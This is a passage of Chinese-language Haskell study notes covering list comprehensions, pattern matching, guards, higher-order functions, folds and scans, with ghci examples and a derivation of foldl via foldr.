[a]\uff1a\u5c06\u503ca\u91cd\u590dn\u6b21\uff0c\u8fd4\u56de\u751f\u6210\u7684\u5217\u8868(replicate n a) List comprehension \u00b6 Haskell \u4e2d\u4e5f\u6709\u5217\u8868\u63a8\u5bfc\uff0c\u5f62\u5f0f\u662f\u4e00\u4e2a\u4e2d\u62ec\u53f7\uff0c\u5de6\u4fa7\u4e3a\u8868\u8fbe\u5f0f\uff0c\u53f3\u4fa7\u4e3a\u53d8\u91cf\u7684\u8303\u56f4\u548c\u7ea6\u675f\u6761\u4ef6 ghci > [ x * 2 | x <- [ 1 .. 10 ]] [ 2 , 4 , 6 , 8 , 10 , 12 , 14 , 16 , 18 , 20 ] ghci > [ x * 2 | x <- [ 1 .. 10 ], x * 2 >= 12 ] [ 12 , 14 , 16 , 18 , 20 ] ghci > [ x | x <- [ 50 .. 100 ], x ` mod ` 7 == 3 ] [ 52 , 59 , 66 , 73 , 80 , 87 , 94 ] ghci > [ x * y | x <- [ 2 , 5 , 10 ], y <- [ 8 , 10 , 11 ]] [ 16 , 20 , 22 , 40 , 50 , 55 , 80 , 100 , 110 ] Tuple \u00b6 Haskell\u4e2d\u7684\u5143\u7ec4\u53ef\u4ee5\u6709\u4e0d\u540c\u957f\u5ea6\uff0c\u5143\u7d20\u53ef\u4ee5\u6709\u4e0d\u540c\u7c7b\u578b\u3002\u5e76\u4e14\u4e00\u4e2a\u5143\u7ec4\u7684\u7c7b\u578b\u7531\u5176\u4e2d\u6240\u6709\u5143\u7d20\u7684\u7c7b\u578b\u5171\u540c\u51b3\u5b9a\u3002\u5b83\u7684\u5e38\u7528\u51fd\u6570\uff1a fst :: (a, b) -> a\uff1a\u8fd4\u56de\u542b\u6709\u4e24\u4e2a\u5143\u7d20\u5143\u7ec4\u4e2d\u7684\u7b2c\u4e00\u4e2a\u5143\u7d20 snd :: (a, b) -> b\uff1a\u8fd4\u56de\u542b\u6709\u4e24\u4e2a\u5143\u7d20\u5143\u7ec4\u4e2d\u7684\u7b2c\u4e8c\u4e2a\u5143\u7d20 zip :: [a] -> [b] -> [(a, b)]\uff1a\u63a5\u6536\u4e24\u4e2a\u5217\u8868\uff0c\u8fd4\u56de\u4e00\u4e2a\u5217\u8868\uff0c\u6bcf\u4e2a\u5143\u7d20\u662f\u4f9d\u6b21\u5c06\u4e24\u4e2a\u5217\u8868\u4e2d\u5143\u7d20\u914d\u5bf9\u6210\u7684\u4e8c\u5143\u7ec4 Syntax in Functions \u00b6 \u51fd\u6570\u53ef\u4ee5\u76f4\u63a5\u5b9a\u4e49\uff1a plus x y = x + y \u8fd9\u65f6Haskell\u4f1a\u81ea\u52a8\u63a8\u65ad\u51fd\u6570\u7684\u7c7b\u578b\u4e3a(Num a) => a -> a -> a\u3002\u4f46\u662f\u6700\u597d\u5728\u5b9a\u4e49\u51fd\u6570\u524d\u58f0\u660e\u51fd\u6570\u7684\u7c7b\u578b\uff1a plus :: ( Num a ) => a -> a -> a plus x y = x + y Pattern matching \u00b6 \u5b9a\u4e49\u51fd\u6570\u65f6\u53ef\u4ee5\u4f7f\u7528\u6a21\u5f0f\u5339\u914d\u8bed\u6cd5\u3002\u8fd0\u884c\u65f6\u4f9d\u6b21\u5c06\u8f93\u5165\u4e0e\u7ed9\u51fa\u7684\u6a21\u5f0f\u76f8\u5339\u914d\uff0c\u5982\u679c\u5339\u914d\uff0c\u5c31\u6267\u884c\u5bf9\u5e94\u64cd\u4f5c\uff1b\u4e0d\u5339\u914d\uff0c\u5c31\u7ee7\u7eed\u4e0e\u4e0b\u4e00\u4e2a\u6a21\u5f0f\u76f8\u5339\u914d\uff0c\u76f4\u5230\u5339\u914d\u6210\u529f\uff0c\u4e5f\u56e0\u6b64\uff0c\u6700\u540e\u5fc5\u987b\u8981\u7ed9\u51fa\u4e00\u79cd\u901a\u7528\u7684\u5339\u914d\u6765\u63a5\u6536\u4e0e\u7ed9\u51fa\u6a21\u5f0f\u5168\u4e0d\u5339\u914d\u7684\u8f93\u5165\u3002\u5982\uff1a factorial :: ( Integral a ) => a -> a factorial 0 = 1 factorial n = n * factorial ( n - 1 ) first :: ( a , b , c ) -> a first ( x , _ , _ ) = x second :: ( a , b , c ) -> b second ( _ , y , _ ) = y third :: ( a , b , c ) -> c third ( _ , _ , z ) = z \u5176\u4e2d _ \u8868\u793a\u4efb\u4f55\u503c\uff0c\u4e14\u4e0d\u5173\u5fc3\u5b83\u7684\u5185\u5bb9\uff0c\u53ea\u662f\u7528\u6765\u5360\u4f4d \u5217\u8868\u7684 (:) \u64cd\u4f5c\u4e5f\u53ef\u4ee5\u7528\u6765\u8fdb\u884c\u6a21\u5f0f\u5339\u914d\uff1a head' :: [ a ] -> a head' [] = error \"Can't call head on an empty list, dummy!\" head' ( x : _ ) = x sum' :: ( Num a ) => [ a ] -> a sum' [] = 0 sum' ( x : xs ) = x + sum' xs \u4f46 (++) \u64cd\u4f5c\u4e0d\u53ef\u4ee5\u7528\u6765\u6a21\u5f0f\u5339\u914d \u5728\u9488\u5bf9\u5217\u8868\u8fdb\u884c\u6a21\u5f0f\u5339\u914d\u65f6\uff0c\u5982\u679c\u540c\u65f6\u9700\u8981\u6574\u4e2a\u5217\u8868\u3001\u5217\u8868\u7684\u7b2c\u4e00\u4e2a\u503c\u3001\u5217\u8868\u9664\u7b2c\u4e00\u4e2a\u503c\u5916\u7684\u5185\u5bb9\uff0c\u53ef\u4ee5\u4f7f\u7528 xs@(q:qs) \u3002\u6bd4\u5982 [1, 2, 3] \u901a\u8fc7 xs@(q:qs) \u5339\u914d\u540e\uff0cxs \u4e3a [1, 2, 3]\uff0cq \u4e3a 1\uff0cqs \u4e3a [2, 3] Guard syntax \u00b6 \u5728\u51fd\u6570\u7684\u5b9a\u4e49\u4e2d\uff0c\u4e5f\u53ef\u4ee5\u4f7f\u7528\u5b88\u536b\uff08guard\uff09\u8bed\u6cd5\uff1a max' :: ( Ord a ) => a -> a -> a max' a b | a > b = a | otherwise = b \u5148\u7ed9\u51fa\u4f20\u5165\u7684\u53c2\u6570\u53d8\u91cf\uff0c\u7136\u540e\u4e0b\u4e00\u884c\u7f29\u8fdb\u540e\u52a0 |\uff0c| \u540e\u9762\u7b49\u53f7\u524d\u8868\u793a\u8fdb\u884c\u7684\u5224\u65ad\uff0c\u5982\u679c\u4e3a True \u5219\u8fd4\u56de\u8fd9\u4e2a\u7b49\u53f7\u540e\u9762\u7684\u503c\uff1b\u5982\u679c\u4e3a False \u5219\u7ee7\u7eed\u5224\u65ad\u4e0b\u4e00\u884c\uff0c\u76f4\u5230 otherwise Case expressions \u00b6 \u5728\u51fd\u6570\u7684\u5b9a\u4e49\u4e2d\uff0c\u4e5f\u53ef\u4ee5\u4f7f\u7528 case \u8868\u8fbe\u5f0f\u6765\u914d\u5408\u6a21\u5f0f\u5339\u914d\u4f7f\u7528\uff1a case expression of pattern -> result pattern -> result ... \u4f8b\u5982\uff1a head' :: [ a ] -> a head' [] = error \"No head for empty lists!\" head' ( x : _ ) = x -- \u7b49\u4ef7\u4e8e\uff1a head' :: [ a ] -> a head' xs = case xs of [] -> error \"No head for empty lists!\" ( x : _ ) -> x describeList :: [ a ] -> String describeList xs = \"The list is \" ++ case xs of [] -> \"empty.\" [ x ] -> \"a singleton list.\" xs -> \"a longer list.\" -- \u7b49\u4ef7\u4e8e\uff1a describeList :: [ a ] -> String describeList xs = \"The list is \" ++ what xs where what [] = \"empty.\" what [ x ] = \"a singleton list.\" what xs = \"a longer list.\" where \u00b6 \u58f0\u660e\u5728\u51fd\u6570\u5b9a\u4e49\u4e2d\u8981\u4f7f\u7528\u7684\u5c40\u90e8\u53d8\u91cf\uff0c\u53ef\u4ee5\u4f7f\u7528 where \u5173\u952e\u5b57\uff1a initials :: String -> String -> String initials firstname lastname = [ f ] ++ \". \" ++ [ l ] ++ \".\" where ( f : _ ) = firstname ( l : _ ) = lastname \u5728 where \u4e2d\uff0c\u4e5f\u53ef\u4ee5\u4f7f\u7528\u4e0a\u9762\u7684\u6a21\u5f0f\u5339\u914d let \u00b6 let <bindings> in <expression> \u8bed\u6cd5\u53ef\u4ee5\u5728\u51fd\u6570\u7684\u5b9a\u4e49\u4e2d\u4f7f\u7528\uff0c\u4e5f\u53ef\u4ee5\u5728\u666e\u901a\u7b97\u5f0f\u6216\u5217\u8868\u4e2d\u4f7f\u7528\uff1a cylinder :: ( RealFloat a ) => a -> a -> a cylinder r h = let sideArea = 2 * pi * r * h topArea = pi * r ^ 2 in sideArea + 2 * topArea ghci > 4 * ( let a = 9 in a + 1 ) + 2 42 ghci > [ let square x = x * x in ( square 5 , square 3 , square 2 )] [( 25 , 9 , 4 )] if statement \u00b6 Haskell \u4e2d\u7684 if \u8bed\u53e5\u4e3a\uff1a if ... then ... else ... -- or if ... then ... else ... -- or if ... then ... else if ... then ... else ... \u5176\u4e2d\u6700\u540e\u4e00\u4e2a else \u65e0\u8bba\u5982\u4f55\u4e5f\u4e0d\u53ef\u4ee5\u7701\u53bb Higher Order Functions \u00b6 Currying \u00b6 Haskell \u4e2d\u7684\u51fd\u6570\u662f\u67ef\u91cc\u5316\uff08Currying\uff09\u7684\uff0c\u53ef\u4ee5\u770b\u4f5c\u6240\u6709\u51fd\u6570\u90fd\u53ea\u63a5\u6536\u4e00\u4e2a\u53c2\u6570\uff0c\u800c\u63a5\u6536\u4e24\u4e2a\u53c2\u6570\u7684\u51fd\u6570\u5b9e\u9645\u4e0a\u662f\u8fd9\u4e2a\u51fd\u6570\u63a5\u6536\u4e86\u7b2c\u4e00\u4e2a\u53c2\u6570\u540e\u8fd4\u56de\u4e86\u4e00\u4e2a\u63a5\u6536\u7b2c\u4e8c\u4e2a\u53c2\u6570\u7684\u51fd\u6570\uff0c\u7136\u540e\u7528\u8fd9\u4e2a\u51fd\u6570\u63a5\u6536\u7b2c\u4e8c\u4e2a\u53c2\u6570\uff0c\u8fd4\u56de\u6700\u7ec8\u7684\u7ed3\u679c\u3002\u6bd4\u5982 max \u51fd\u6570\uff0c\u5b83\u7684\u7c7b\u578b\u7b7e\u540d\u662f\uff1a max :: Ord a => a -> a -> a \u53ef\u4ee5\u770b\u6210 a -> (a -> a)\uff0c\u5373\u63a5\u6536\u4e00\u4e2a\u53c2\u6570\uff0c\u8fd4\u56de\u4e00\u4e2a\u7c7b\u578b\u4e3a a -> a \u7684\u51fd\u6570\u3002\u6bd4\u5982 max 1 \u7684\u7c7b\u578b\u7b7e\u540d\u662f\uff1a max 1 :: (Ord a, Num a) => a -> a \u56e0\u6b64 max 1 2\uff0c\u4e5f\u5c31\u7b49\u540c\u4e8e (max 1) 2\uff0c\u5373\u5c06\u51fd\u6570 max 1 \u5e94\u7528\u5728\u6570\u5b572\u4e0a \u540c\u65f6\uff0c\u51fd\u6570\u4e5f\u53ef\u4ee5\u63a5\u6536\u51fd\u6570\u4f5c\u4e3a\u53c2\u6570\uff0c\u53c2\u6570\u6709\u51fd\u6570\u7684\u51fd\u6570\u5c31\u88ab\u79f0\u4e3a\u9ad8\u9636\u51fd\u6570\uff08Higher Order Functions\uff09 \u4e00\u4e9b\u9ad8\u9636\u51fd\u6570 \u00b6 zipWith \u00b6 zipWith :: (a -> b -> c) -> [a] -> [b] -> [c] \u7b2c\u4e00\u4e2a\u53c2\u6570\u4e3a\u4e00\u4e2a\u51fd\u6570\uff0c\u7136\u540e\u63a5\u6536\u4e24\u4e2a\u5217\u8868\uff0c\u5c06\u5176\u5bf9\u5e94\u5143\u7d20\u4f20\u5165\u63a5\u6536\u7684\u51fd\u6570\u4e2d\uff0c\u5f97\u5230\u7684\u7ed3\u679c\u7ec4\u6210\u4e00\u4e2a\u65b0\u7684\u5217\u8868\u3002\u5982\u679c\u4e24\u4e2a\u4f20\u5165\u7684\u5217\u8868\u957f\u5ea6\u4e0d\u540c\uff0c\u4ee5\u6700\u77ed\u7684\u5217\u8868\u4e3a\u51c6\uff0c\u957f\u5217\u8868\u4e2d\u8d85\u51fa\u7684\u5143\u7d20\u7701\u7565\u3002\u7528\u4f8b\uff1a ghci > zipWith ( + ) [ 4 , 2 , 5 , 6 ] [ 2 , 6 , 2 , 3 ] [ 6 , 8 , 7 , 9 ] ghci > zipWith max [ 6 , 3 , 2 , 1 ] [ 7 , 3 , 1 , 5 ] [ 7 , 3 , 2 , 5 ] flip \u00b6 flip :: (a -> b -> c) -> b -> a -> c flip \u51fd\u6570\u63a5\u6536\u4e00\u4e2a\u4e8c\u5143\u51fd\u6570\uff0c\u8fd4\u56de\u4e00\u4e2a\u65b0\u7684\u4e8c\u5143\u51fd\u6570\uff0c\u5c06\u5176\u8f93\u5165\u7684\u4e24\u4e2a\u53c2\u6570\u987a\u5e8f\u53cd\u8fc7\u6765\uff1a ghci > zip [ 1 , 2 , 3 , 4 , 5 ] \"hello\" [( 1 , 'h' ),( 2 , 'e' ),( 3 , 'l' ),( 4 , 'l' ),( 5 , 'o' )] ghci > flip zip [ 1 , 2 , 3 , 4 , 5 ] \"hello\" [( 'h' , 1 ),( 'e' , 2 ),( 'l' , 3 ),( 'l' , 4 ),( 'o' , 5 )] map \u00b6 map :: (a -> b) -> [a] -> [b] map \u51fd\u6570\u63a5\u6536\u4e00\u4e2a\u51fd\u6570 f \u548c\u4e00\u4e2a\u5217\u8868 a\uff0c\u5c06\u51fd\u6570 f \u5e94\u7528\u5728\u5217\u8868 a \u7684\u6bcf\u4e2a\u5143\u7d20\u4e2d\uff0c\u5e76\u8fd4\u56de\u5f97\u5230\u7684\u6240\u6709\u7ed3\u679c\u7ec4\u6210\u7684\u5217\u8868 b\uff1a ghci > map ( + 3 ) [ 1 , 5 , 3 , 1 , 6 ] [ 4 , 8 , 6 , 4 , 9 ] filter \u00b6 filter :: (a -> Bool) -> [a] -> [a] filter \u51fd\u6570\u63a5\u6536\u4e00\u4e2a\u51fd\u6570 f \u548c\u4e00\u4e2a\u5217\u8868 a\uff0c\u5c06\u5217\u8868 a \u4e2d\u7684\u6bcf\u4e2a\u5143\u7d20\u4f20\u5165\u51fd\u6570 f \u4e2d\uff0c\u5982\u679c\u7ed3\u679c\u4e3a True \u5c31\u4fdd\u7559\uff0c\u7ed3\u679c\u4e3a False \u5c31\u629b\u5f03\uff0c\u8fd4\u56de\u6240\u6709\u4fdd\u7559\u7684\u5143\u7d20\u7ec4\u6210\u7684\u65b0\u5217\u8868\uff1a ghci > filter even [ 1 .. 10 ] [ 2 , 4 , 6 , 8 , 10 ] takeWhile \u00b6 takeWhile :: (a -> Bool) -> [a] -> [a] takeWhile \u51fd\u6570\u63a5\u6536\u4e00\u4e2a\u51fd\u6570 f \u548c\u4e00\u4e2a\u5217\u8868 a\uff0c\u5c06\u5217\u8868 a \u4e2d\u4ece\u5de6\u5411\u53f3\u6bcf\u4e2a\u5143\u7d20\u4f20\u5165\u51fd\u6570 f\uff0c\u76f4\u5230\u7ed3\u679c\u4e3a False \u505c\u6b62\uff0c\u8fd4\u56de\u505c\u6b62\u524d\u4f20\u5165\u7684\u6240\u6709\u5143\u7d20\u7ec4\u6210\u7684\u65b0\u5217\u8868\uff1a ghci > takeWhile ( /= ' ' ) \"word1 word2\" \"word1\" Function application \u00b6 \u51fd\u6570\u5e94\u7528\u53ef\u4ee5\u4f7f\u7528 $ \uff0c $ \u662f\u4e00\u4e2a\u51fd\u6570\uff0c\u5b83\u7684\u7c7b\u578b\u662f\uff1a ($) :: (a -> b) -> a -> b \u5b83\u53ef\u4ee5\u6539\u53d8\u51fd\u6570\u7ed3\u5408\u4f18\u5148\u7ea7\uff0c\u5c06\u5de6\u4fa7\u51fd\u6570\u5e94\u7528\u4e8e\u5168\u90e8\u53f3\u4fa7\u5185\u5bb9\u4e0a\uff0c\u76f8\u5f53\u4e8e\u7ed9\u53f3\u4fa7\u6574\u4f53\u52a0\u4e0a\u4e86\u62ec\u53f7\u3002\u5426\u5219\u51fd\u6570\u9ed8\u8ba4\u5de6\u7ed3\u5408\uff0c\u4f1a\u4f9d\u6b21\u5411\u53f3\u5e94\u7528\u800c\u4e0d\u4f1a\u5e94\u7528\u5728\u6574\u4f53\u4e0a\u3002 f $ g x -- \u7b49\u4ef7\u4e8e f ( g x ) ----- f g x -- \u7b49\u4ef7\u4e8e ( f g ) x Function Composition \u00b6 \u51fd\u6570\u590d\u5408\u53ef\u4ee5\u4f7f\u7528 . \uff0c . \u4e5f\u662f\u4e00\u4e2a\u51fd\u6570\uff0c\u5b83\u7684\u7c7b\u578b\u662f\uff1a (.) :: (b -> c) -> (a -> b) -> a -> c \u5b9a\u4e49\u662f\uff1a f . g = \\x -> f (g x) \u4f46\u662f\u51fd\u6570\u590d\u5408\u7684\u4f18\u5148\u7ea7\u8981\u6bd4\u51fd\u6570\u6267\u884c\u4f4e\uff0c\u6bd4\u5982\uff1a sum . replicate 5 . max 6.7 8.9 \u4f1a\u5148\u6267\u884c max 6.7 8.9 \u5e76\u8fd4\u56de 8.9\uff0c\u7136\u540e\u5c06 sum\u3001replicate 5\u30018.9 \u590d\u5408\uff0c\u4f46\u4e24\u4e2a\u51fd\u6570\u65e0\u6cd5\u548c\u4e00\u4e2a\u503c (8.9) \u590d\u5408\uff0c\u6240\u4ee5\u4f1a\u629b\u51fa\u5f02\u5e38\u3002\u56e0\u6b64\u8981\u4f7f\u7528 $ \u6765\u89c4\u5b9a\u5148\u590d\u5408\u518d\u6267\u884c\uff1a sum . replicate 5 . max 6.7 $ 8.9 lambda \u00b6 Haskell \u8bed\u8a00\u4e2d\u7684 lambda \u8868\u8fbe\u5f0f\u662f\u7528 \\ \u6765\u8868\u793a\u7684\uff08\u56e0\u4e3a\u770b\u7740\u50cf \\(\\mathtt{\\lambda}\\) \uff1f\uff09 \u5177\u4f53\u8bed\u6cd5\u662f \\ para1 para2 ... -> return \"->\" \u524d\u7684 para1 para2 ... \u662f\u4f20\u5165\u53c2\u6570\uff0c\u5355\u4e2a\u591a\u4e2a\u90fd\u53ef\u4ee5\uff0c\u9700\u8981\u7528\u7a7a\u683c\u9694\u5f00\uff1b\"->\" \u540e\u7684 return \u662f\u8ba1\u7b97\u5f97\u5230\u7684\u8fd4\u56de\u503c\u3002\u4e00\u822c\u9700\u8981\u7528\u62ec\u53f7\u5c06\u6574\u4e2a\u8868\u8fbe\u5f0f\u62ec\u8d77\u6765\uff0c\u9632\u6b62\u8fd4\u56de\u503c\u90e8\u5206\u4e00\u76f4\u5411\u53f3\u5ef6\u4f38\u3002 fold\u548cscan \u00b6 fold \u548c scan \u90fd\u63a5\u6536\u4e09\u4e2a\u53c2\u6570\uff08\u4e00\u4e2a\u4e8c\u5143\u51fd\u6570\uff0c\u4e00\u4e2a\u521d\u59cb\u503c accumulator\uff0c\u4e00\u4e2a\u8981\u6298\u53e0\u7684\u5217\u8868\uff09\uff0cfold \u8fd4\u56de\u4e00\u4e2a\u503c\uff0c\u800c scan \u8fd4\u56de\u4e00\u4e2a\u5217\u8868 \u4f20\u5165\u7684\u4e8c\u5143\u51fd\u6570 f :: a -> b -> b \u5c06 accumulator \u548c\u4ece\u5217\u8868\u4e2d\u53d6\u51fa\u7684\u503c\u4e00\u540c\u4f20\u5165\uff08l \u5219 accumulator \u5728\u5de6\u8fb9\u4e3a\u7b2c\u4e00\u4e2a\u53c2\u6570\uff0cr \u5219 accumulator \u5728\u53f3\u8fb9\u4e3a\u7b2c\u4e8c\u4e2a\u53c2\u6570\uff09 foldl \u00b6 \u5de6\u6298\u53e0\uff0c\u6bcf\u6b21\u4ece\u5217\u8868\u6700\u5de6\u4fa7\u53d6\u51fa\u4e00\u4e2a\u503c\uff0c\u548c accumulator \u4e00\u8d77\u4f20\u5165\u4e8c\u5143\u51fd\u6570\uff0c\u5e76\u4e14 accumulator \u5728\u5de6\u8fb9\u4e3a\u7b2c\u4e00\u4e2a\u53c2\u6570\uff0c\u5982\uff1a foldl f a xs \u5b83\u7684\u7ed3\u679c\u8ba1\u7b97\u8fc7\u7a0b\u4e3a > foldl f a [ x1 , x2 , x3 ] [ 1 . ] a = f a x1 [ 2 . ] a = f a x2 = f ( f a x1 ) x2 [ 3 . ] a = f a x3 = f ( f ( f a x1 ) x2 ) x3 \u53ef\u4ee5\u770b\u51fa f (f a x1) x2 \u5176\u5b9e\u5c31\u662f foldl f a [x1, x2] \u800c\u4e14\u56e0\u6b64\uff0cfoldl \u5728\u8ba1\u7b97\u65f6\u6700\u5916\u5c42\u9700\u8981\u627e\u5230 x3\uff0c\u8fd9\u6837\u5982\u679c xs \u662f\u4e00\u4e2a\u65e0\u7a77\u5217\u8868\uff0c\u90a3\u4e48\u5c06\u65e0\u6cd5\u8ba1\u7b97\uff0c\u9677\u5165\u65e0\u7a77\u3002\u6240\u4ee5 foldl \u867d\u7136\u770b\u8d77\u6765\u4ece\u5de6\u8fb9\u53d6\u503c\uff0c\u4f46\u662f\u51fd\u6570\u9700\u8981\u4ece\u53f3\u4fa7\u5c55\u5f00\uff0c\u5e76\u4e0d\u9002\u7528\u4e8e\u65e0\u7a77\u5217\u8868 foldr \u00b6 \u53f3\u6298\u53e0\uff0c\u6bcf\u6b21\u4ece\u5217\u8868\u6700\u53f3\u4fa7\u53d6\u51fa\u4e00\u4e2a\u503c\uff0c\u548c accumulator \u4e00\u8d77\u4f20\u5165\u4e8c\u5143\u51fd\u6570\uff0c\u5e76\u4e14 accumulator \u5728\u53f3\u8fb9\u4e3a\u7b2c\u4e8c\u4e2a\u53c2\u6570\uff0c\u5982\uff1a foldr f a xs \u5b83\u7684\u7ed3\u679c\u8ba1\u7b97\u8fc7\u7a0b\u4e3a > foldr f a [ x1 , x2 , x3 ] [ 1 . ] a = f x3 a [ 2 . ] a = f x2 a = f x2 ( f x3 a ) [ 3 . ] a = f x1 a = f x1 ( f x2 ( f x3 a )) \u4ece\u4e2d\u53ef\u4ee5\u770b\u51fa f x2 (f x3 a) \u5c31\u662f foldr f a [x2, x3] \u56e0\u6b64\u53ef\u4ee5\u4f7f\u7528\u9012\u5f52\u6765\u5199\u4e00\u4e2a\u548c foldr \u6548\u679c\u4e00\u6837\u7684\u51fd\u6570: foldr' :: ( a -> b -> b ) -> b -> [ a ] -> b foldr' _ x [] = x foldr' f a ( x : xs ) = f x ( foldr' f a xs ) \u4e5f\u53ef\u4ee5\u770b\u51fa\uff0c\u6700\u5916\u5c42\u8ba1\u7b97\u65f6\u53ea\u9700\u8981 x1 \u5e76\u4e14\u5411\u4e0b\u9012\u5f52\uff0c\u5e76\u4e0d\u4f1a\u63a5\u89e6\u5230\u5217\u8868\u672b\u5c3e\uff0c\u56e0\u6b64\u53ef\u4ee5\u7528\u4e8e\u65e0\u7a77\u5217\u8868\u3002foldr \u5373\u4f7f\u770b\u4e0a\u53bb\u4ece\u53f3\u8fb9\u53d6\u503c\uff0c\u4f46\u662f\u8981\u4ece\u5de6\u5f00\u59cb\u5c55\u5f00\uff0c\u53ef\u4ee5\u7528\u4e8e\u65e0\u7a77\u5217\u8868 \u4f8b\u5982\uff1a ghci > foldr ( || ) False ( repeat True ) True -- \u7531\u4e8e\u903b\u8f91\u8fd0\u7b97\u5b58\u5728\u77ed\u8def\uff0c\u8ba1\u7b97\u503c\u5168\u5e94\u4e3aTrue\uff0c\u6240\u4ee5\u76f4\u63a5\u8fd4\u56de\u4e86 ghci > foldl ( || ) False ( repeat True ) -- \u8fd9\u91cc\u4ec0\u4e48\u90fd\u4e0d\u4f1a\u53d1\u751f\uff0c\u76f4\u5230\u7535\u8111\u5185\u5b58\u88ab\u7206\u6389 -- \u56e0\u4e3a\u51fd\u6570\u521a\u5f00\u59cb\u5c31\u9700\u8981\u5217\u8868\u6700\u53f3\u4fa7\u7684\u503c\uff0c\u6240\u4ee5\u5728\u4e0d\u65ad\u8ba1\u7b97\u8fd9\u4e2a\u65e0\u7a77\u5217\u8868 scanl \u548c scanr \u00b6 scan \u7c7b\u4f3c fold\uff0c\u53ea\u662f\u5c06\u4e2d\u95f4\u5f97\u5230\u7684\u6bcf\u4e00\u4e2a\u503c\u90fd\u6dfb\u52a0\u8fdb\u4e00\u4e2a\u5217\u8868\u4e2d\u5e76\u8fd4\u56de\u8fd9\u4e2a\u5217\u8868 scanl \u5219\u5411\u53f3\u5ef6\u4f38\u8fd9\u4e2a\u5217\u8868\uff0cscanr \u5219\u5411\u5de6\u5ef6\u4f38\u8fd9\u4e2a\u5217\u8868 \u4f46\u662f\u5b83\u548c fold \u6070\u6070\u76f8\u53cd\uff0cscanl \u80fd\u7528\u4e8e\u65e0\u7a77\u5217\u8868\uff0c\u800c scanr \u4e0d\u80fd > scanr f a [ x1 , x2 , x3 ] [ 1 . ] \u6700\u53f3\u4fa7\u5143\u7d20 ( - 1 in python ) : a [ 2 . ] \u53f3\u4fa7\u7b2c\u4e8c\u4e2a\u5143\u7d20 ( - 2 ) : f x3 a [ 3 . ] \u53f3\u4fa7\u7b2c\u4e09\u4e2a\u5143\u7d20 ( - 3 ) : f x2 ( f x3 a ) [ 4 . ] \u53f3\u4fa7\u7b2c\u56db\u4e2a\u5143\u7d20 ( - 4 ) : f x1 ( f x2 ( f x3 a )) \u53ef\u4ee5\u770b\u51fa f x2 (f x3 a) \u662f foldr f a [x2, x3]\uff0c\u4e5f\u662f scanr f a [x2, x3] \u7684\u7b2c\u4e00\u4e2a\u5143\u7d20 \u56e0\u6b64\u53ef\u4ee5\u7528\u9012\u5f52\u6765\u5199\u4e00\u4e2a\u548c scanr \u6548\u679c\u4e00\u6837\u7684\u51fd\u6570\uff1a scanr' :: ( a -> b -> b ) -> b -> [ a ] -> [ b ] scanr' _ x [] = [ x ] -- scanr' f a (x:xs) = f x (foldr f a xs) : scanr' f a xs scanr' f a ( x : xs ) = f x q : qs where qs @ ( q : _ ) = scanr' f a xs scanl \u4e5f\u662f\u540c\u7406\uff1a scanl' :: ( b -> a -> b ) -> b -> [ a ] -> [ b ] scanl' _ x [] = [ x ] scanl' f a ( x : xs ) = a : scanl' f ( f a x ) xs \u4e5f\u53ef\u4ee5\u770b\u51fa\uff0cscanr \u8fd4\u56de\u7684\u5217\u8868\u7684\u7b2c\u4e00\u4e2a\u5143\u7d20\u662f\u6700\u540e\u6dfb\u52a0\u8fdb\u53bb\u7684\uff0c\u6240\u4ee5\u5b83\u65e0\u6cd5\u7528\u4e8e\u65e0\u7a77\u5217\u8868\u3002\u800c scanl \u8fd4\u56de\u7684\u5217\u8868\u4e2d\u7684\u5143\u7d20\u662f\u4ece\u5de6\u5230\u53f3\u4f9d\u6b21\u6dfb\u52a0\uff0c\u53ef\u4ee5\u7528\u4e8e\u65e0\u7a77\u5217\u8868\u622a\u53d6\u524d\u4e00\u90e8\u5206\u7ed3\u679c\uff1a ghci > take 10 ( scanl ( + ) 0 [ 1 .. ]) [ 0 , 1 , 3 , 6 , 10 , 15 , 21 , 28 , 36 , 45 ] ghci > take 10 ( scanr ( + ) 0 [ 1 .. ]) [ *** Exception: stack overflow \u4f7f\u7528 foldr \u7f16\u5199 foldl \u00b6 pdcxs \u8fd8\u7ed9\u6211\u4ecb\u7ecd\u4e86\u4e00\u4e2a\u795e\u5947\u7684\u64cd\u4f5c\uff0c\u7528 foldl \u6765\u5b9a\u4e49 foldr\uff1a foldl' f z xs = foldr ( \\ x g y -> g ( f y x )) id xs z \u5b83\u5229\u7528 foldr (\\x g y -> g (f y x)) id xs \u751f\u6210\u4e00\u4e2a\u51fd\u6570\uff0c\u4f5c\u7528\u4e8ez\u5f97\u5230\u7ed3\u679c\u3002 \u5148\u6765\u770b\u4e00\u4e0b foldr \u7684\u7c7b\u578b\uff1a foldr :: Foldable t => ( a -> b -> b ) -> b -> t a -> b -- \u53ef\u4ee5\u770b\u6210 (a -> b -> b) -> b -> [a] -> b \u4f46\u662f\u5728\u8fd9\u4e2a\u4f8b\u5b50\u4e2d\uff0c\u7c7b\u578b b \u5e76\u4e0d\u662f\u4e00\u4e2a\u6570\u5b57\uff0c\u800c\u662f\u4e00\u4e2a\u51fd\u6570 (b -> b)\u3002 \u6240\u4ee5\u8fd9\u91cc foldr \u7684\u7c7b\u578b\u53ef\u4ee5\u5199\u6210\uff1a (a -> (b -> b) -> (b -> b)) -> (b -> b) -> [a] -> (b -> b) \u5bf9\u5e94\u4e8e\u7528\u6cd5 foldr (\\x g y -> g (f y x)) id xs \uff0c\u5b83\u8fd4\u56de\u7684\u503c\u5e94\u8be5\u662f\u4e00\u4e2a\u51fd\u6570\uff0c\u7c7b\u578b\u4e3a b -> b\uff08\u540e\u9762\u8981\u4f5c\u7528\u4e8ez\uff09 \u800c xs \u5bf9\u5e94\u4e8e [a]\uff1bid \u5bf9\u5e94\u4e8e (b -> b) \u6240\u4ee5 (\\x g y -> g (f y x)) \u8981\u5bf9\u5e94\u4e8e\uff1a (a -> (b -> b) -> (b -> b)) \u56e0\u6b64\u53ef\u4ee5\u63a8\u65ad\u51fa x \u7684\u7c7b\u578b\u662f a\uff1by \u7684\u7c7b\u578b\u662f b\uff1b\u800c\u8fd4\u56de\u7684\u503c\u4e3a\u4e00\u4e2a\u7c7b\u578b\u4e3a (b -> b) \u7684\u51fd\u6570\u3002 \u518d\u770b\uff0c\u8fd4\u56de\u7684\u503c\u662f g (f y x) \uff0c\u5176\u4e2d f y x \u8fd4\u56de\u7684\u662f\u4e00\u4e2a\u503c\uff0c\u7c7b\u578b\u4e3a b \u6240\u4ee5 g \u63a5\u6536\u4e00\u4e2a\u7c7b\u578b b\uff0c\u8fd4\u56de\u4e00\u4e2a\u7c7b\u578b b -> b\u3002\u5373 g \u7684\u7c7b\u578b\u4e3a\uff1a b -> (b -> b) \u73b0\u5728\u6839\u636e foldr \u7684\u5b9a\u4e49\uff1a foldr f a (x:xs) = f x (foldr f a xs) 